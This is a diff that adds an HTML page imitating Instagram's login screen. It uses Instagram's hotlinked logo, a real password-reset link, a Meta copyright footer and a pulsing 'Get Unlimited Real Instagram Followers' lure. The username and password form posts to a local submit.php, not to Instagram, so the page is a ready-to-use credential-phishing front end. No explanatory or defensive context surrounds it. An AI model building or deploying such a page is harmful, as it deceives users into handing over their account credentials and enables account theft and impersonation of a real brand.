@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Instagram Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  body {
+    background: #fafafa;
+    font-family: 'Roboto', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    width: 350px;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 30px 40px;
+    box-sizing: border-box;
+    text-align: center;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    border-radius: 8px;
+  }
+  .logo {
+    margin-bottom: 30px;
+  }
+  form input[type="text"],
+  form input[type="password"] {
+    width: 100%;
+    padding: 11px 10px;
+    margin-bottom: 12px;
+    border: 1px solid #dbdbdb;
+    background: #fafafa;
+    border-radius: 4px;
+    font-size: 14px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease;
+  }
+  form input[type="text"]:focus,
+  form input[type="password"]:focus {
+    outline: none;
+    border-color: #a8a8a8;
+    background: #fff;
+  }
+  form input[type="submit"] {
+    width: 100%;
+    background-color: #0095f6;
+    border: none;
+    padding: 11px 0;
+    border-radius: 4px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background-color 0.3s ease;
+  }
+  form input[type="submit"]:hover {
+    background-color: #007acc;
+  }
+  .forgot {
+    margin-top: 14px;
+    font-size: 12px;
+    color: #00376b;
+  }
+  .forgot a {
+    color: #00376b;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .forgot a:hover {
+    text-decoration: underline;
+  }
+  .promo-text {
+    margin-top: 24px;
+    font-weight: 700;
+    font-size: 17px;
+    color: #ed4956; /* Instagram's red/pink tone */
+    user-select: none;
+    animation: pulse 2.5s infinite ease-in-out;
+    letter-spacing: 0.5px;
+  }
+  @keyframes pulse {
+    0%, 100% {
+      opacity: 1;
+      transform: scale(1);
+      text-shadow: 0 0 8px #ed4956;
+    }
+    50% {
+      opacity: 0.8;
+      transform: scale(1.05);
+      text-shadow: 0 0 15px #f56068;
+    }
+  }
+  .footer {
+    margin-top: 26px;
+    font-size: 13px;
+    color: #999;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Instagram login form">
+    <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" width="180" />
+    <form action="submit.php" method="post" autocomplete="off" novalidate>
+      <input type="text" name="username" placeholder="Phone number, username, or email" required aria-label="Username" />
+      <input type="password" name="password" placeholder="Password" required aria-label="Password" />
+      <input type="submit" value="Log In" />
+    </form>
+    <div class="forgot">
+      <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" rel="noopener noreferrer" aria-label="Forgot password link">Forgot password?</a>
+    </div>
+    <div class="promo-text" aria-live="polite">Get Unlimited Real Instagram Followers</div>
+    <div class="footer">© 2025 Instagram from Meta</div>
+  </div>
+</body>
+</html>
